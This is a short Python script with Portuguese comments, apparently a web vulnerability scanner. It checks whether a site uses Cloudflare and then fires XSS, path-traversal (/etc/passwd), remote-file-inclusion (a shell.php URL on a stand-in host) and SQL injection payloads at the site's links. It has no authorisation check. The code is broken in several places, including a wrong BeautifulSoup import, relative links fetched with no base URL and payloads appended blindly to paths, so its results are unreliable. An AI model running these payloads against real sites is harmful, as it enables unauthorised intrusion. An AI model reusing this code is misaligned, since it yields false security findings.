# Importar os módulos necessários
import requests
import BeautifulSoup
import re
import sys

# Definir a função que obtém o conteúdo HTML de uma url
def get_html(url):
    try:
        # Enviar uma requisição GET para a url
        response = requests.get(url)
        # Verificar se a resposta foi bem sucedida
        if response.status_code == 200:
            # Retornar o conteúdo HTML da resposta
            return response.text
        else:
            # Retornar uma mensagem de erro
            return f"Erro ao acessar a url {url}"
    except Exception as e:
        # Retornar uma mensagem de exceção
        return f"Exceção ao acessar a url {url}: {e}"

# Definir a função que extrai os links internos de um conteúdo HTML
def get_links(html):
    # Criar uma lista vazia para armazenar os links
    links = []
    # Criar um objeto BeautifulSoup para analisar o HTML
    soup = BeautifulSoup(html, "html.parser")
    # Encontrar todas as tags <a> que tenham o atributo href
    tags = soup.find_all("a", href=True)
    # Iterar sobre as tags encontradas
    for tag in tags:
        # Obter o valor do atributo href
        href = tag["href"]
        # Verificar se o valor é um link interno, ou seja, que começa com "/" ou não tem "http" no início
        if href.startswith("/") or not href.startswith("http"):
            # Adicionar o link à lista de links
            links.append(href)
    # Retornar a lista de links
    return links

# Definir a função que testa os links para possíveis vulnerabilidades
def test_links(links):
    # Criar uma lista vazia para armazenar os resultados
    results = []
    # Criar um dicionário com os tipos de vulnerabilidades e os payloads correspondentes
    vulnerabilities = {
        "XSS": "<script>alert('XSS')</script>",
        "LFI": "../../../../etc/passwd",
        "RFI": "http://example.com/shell.php",
        "SQLi": "' OR 1=1 --"
    }
    # Iterar sobre os links
    for link in links:
        # Iterar sobre os tipos de vulnerabilidades
        for vuln, payload in vulnerabilities.items():
            # Construir a url com o payload
            url = link + payload
            try:
                # Enviar uma requisição GET para a url
                response = requests.get(url)
                # Verificar se a resposta contém o payload ou algum indício de vulnerabilidade
                if payload in response.text or "error" in response.text.lower() or "alert" in response.text.lower():
                    # Adicionar o resultado à lista de resultados
                    results.append(f"{url} é vulnerável a {vuln}")
            except Exception as e:
                # Ignorar as exceções
                pass
    # Retornar a lista de resultados
    return results

# Definir a função que verifica se uma url está hospedada na cloudflare
def check_cloudflare(url):
    try:
        # Enviar uma requisição HEAD para a url
        response = requests.head(url)
        # Obter os cabeçalhos da resposta
        headers = response.headers
        # Verificar se o campo "server" contém o valor "cloudflare"
        if "server" in headers and "cloudflare" in headers["server"].lower():
            # Retornar verdadeiro
            return True
        else:
            # Retornar falso
            return False
    except Exception as e:
        # Retornar falso
        return False

# Definir a função principal
def main(url):
    # Verificar se a url está hospedada na cloudflare
    if check_cloudflare(url):
        # Imprimir uma mensagem
        print(f"A url {url} está hospedada na cloudflare")
        # Obter o conteúdo HTML da url
        html = get_html(url)
        # Extrair os links internos do conteúdo HTML
        links = get_links(html)
        # Testar os links para possíveis vulnerabilidades
        results = test_links(links)
        # Imprimir os resultados
        for result in results:
            print(result)
    else:
        # Imprimir uma mensagem
        print(f"A url {url} não está hospedada na cloudflare")

# Executar a função principal com a url fornecida como argumento
if __name__ == "__main__":
    # Verificar se o argumento foi fornecido
    if len(sys.argv) > 1:
        # Obter a url do argumento
        url = sys.argv[1]
        # Executar a função principal
        main(url)
    else:
        # Imprimir uma mensagem de uso
        print("Uso: python3 scanner.py <url>")
